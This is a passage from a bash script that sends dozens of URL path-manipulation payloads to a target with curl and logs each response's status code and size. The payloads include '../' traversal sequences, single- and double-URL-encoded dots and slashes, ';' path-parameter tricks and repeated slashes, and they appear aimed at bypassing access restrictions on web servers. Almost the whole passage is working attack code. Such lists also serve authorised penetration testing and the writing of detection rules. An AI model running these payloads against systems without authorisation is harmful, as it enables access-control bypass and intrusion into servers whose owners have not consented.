code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent")
print
echo -n "Payload [ /%20%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%253b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%253b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent")
print
echo -n "Payload [ /%252f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent")
print
echo -n "Payload [ /%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent")
print
echo -n "Payload [ /%3b/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent")
print
echo -n "Payload [ /.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent")
print
echo -n "Payload [ /..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
print
echo -n "Payload [ /../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent")
print
echo -n "Payload [ /../../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent")
print
echo -n "Payload [ /../../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent")
print
echo -n "Payload [ /../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent")
print
echo -n "Payload [ /../..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent")
print
echo -n "Payload [ /../..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent")
print
echo -n "Payload [ /.././../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent")
print
echo -n "Payload [ /../.;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../.;/../" -H "$user_agent")
print
echo -n "Payload [ /..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//" -H "$user_agent")
print
echo -n "Payload [ /..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../" -H "$user_agent")
print
echo -n "Payload [ /..//../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//../../" -H "$user_agent")
print
echo -n "Payload [ /..//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..//..;/" -H "$user_agent")
print
echo -n "Payload [ /../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/" -H "$user_agent")
print
echo -n "Payload [ /../;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../;/../" -H "$user_agent")
print
echo -n "Payload [ /..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;%2f..;%2f..;%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;%2f..;%2f..;%2f" -H "$user_agent")
print
echo -n "Payload [ /..;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/../" -H "$user_agent")
print
echo -n "Payload [ /..;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/..;/" -H "$user_agent")
print
echo -n "Payload [ /..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//" -H "$user_agent")
print
echo -n "Payload [ /..;//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//../" -H "$user_agent")
print
echo -n "Payload [ /..;//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;//..;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /..;/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ /.// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.//" -H "$user_agent")
print
echo -n "Payload [ /.;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;/" -H "$user_agent")
print
echo -n "Payload [ /.;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.;//" -H "$user_agent")
print
echo -n "Payload [ //.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.." -H "$user_agent")
print
echo -n "Payload [ //../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//../../" -H "$user_agent")
print
echo -n "Payload [ //..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//..;" -H "$user_agent")
print
echo -n "Payload [ //./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//./" -H "$user_agent")
print
echo -n "Payload [ //.;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//.;/" -H "$user_agent")
print
echo -n "Payload [ ///.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///.." -H "$user_agent")
print
echo -n "Payload [ ///../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///../" -H "$user_agent")
print
echo -n "Payload [ ///..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..//" -H "$user_agent")
print
echo -n "Payload [ ///..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;" -H "$user_agent")
print
echo -n "Payload [ ///..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;/" -H "$user_agent")
print
echo -n "Payload [ ///..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL///..;//" -H "$user_agent")
print
echo -n "Payload [ //;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//;/" -H "$user_agent")
print
echo -n "Payload [ /;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;/" -H "$user_agent")
print
echo -n "Payload [ /;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;//" -H "$user_agent")
print
echo -n "Payload [ /;x ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x" -H "$user_agent")
print
echo -n "Payload [ /;x/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;x/" -H "$user_agent")
print
echo -n "Payload [ /x/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../" -H "$user_agent")
print
echo -n "Payload [ /x/..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..//" -H "$user_agent")
print
echo -n "Payload [ /x/../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/../;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/" -H "$user_agent")
print
echo -n "Payload [ /x/..;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;//" -H "$user_agent")
print
echo -n "Payload [ /x/..;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent"
